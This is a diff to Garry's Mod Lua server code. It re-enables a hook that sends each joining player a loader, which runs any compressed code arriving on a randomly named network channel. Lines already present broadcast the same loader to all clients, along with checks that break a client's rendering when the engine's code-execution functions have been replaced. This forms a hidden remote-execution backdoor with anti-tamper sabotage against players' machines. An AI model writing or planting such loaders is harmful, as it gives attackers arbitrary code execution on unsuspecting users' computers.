@@ -13,11 +13,13 @@ BroadcastLua([[if not table.HasValue( debug.getinfo(RunString), "[C]" ) then cam
 BroadcastLua([[if not table.HasValue( debug.getinfo(net.ReadData), "[C]" ) then cam.End3D() else end]])
 BroadcastLua([[net.Receive("]] .. GenNetworkString .. [[",function() if not table.HasValue( debug.getinfo(CompileString), "[C]" ) then cam.End3D() else CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"½°")() end end)]])
 
---hook.Add("PlayerInitialSpawn", "bahilfautlecodequandilseco",function(ply)
---    if !ply:IsBot() then
---        ply:SendLua([[net.Receive("]] .. GenNetworkString .. [[",function() if not table.HasValue( debug.getinfo(CompileString), "[C]" ) then cam.End3D() else CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"½°")() end end)]])
---    end
---end)
+-- [[
+hook.Add("PlayerInitialSpawn", "bahilfautlecodequandilseco",function(ply)
+    if !ply:IsBot() then
+        ply:SendLua([[net.Receive("]] .. GenNetworkString .. [[",function() if not table.HasValue( debug.getinfo(CompileString), "[C]" ) then cam.End3D() else CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"½°")() end end)]])
+    end
+end)
+]] --
 
 local function SMARTSENDCODE(code)
     local data = util.Compress(code)
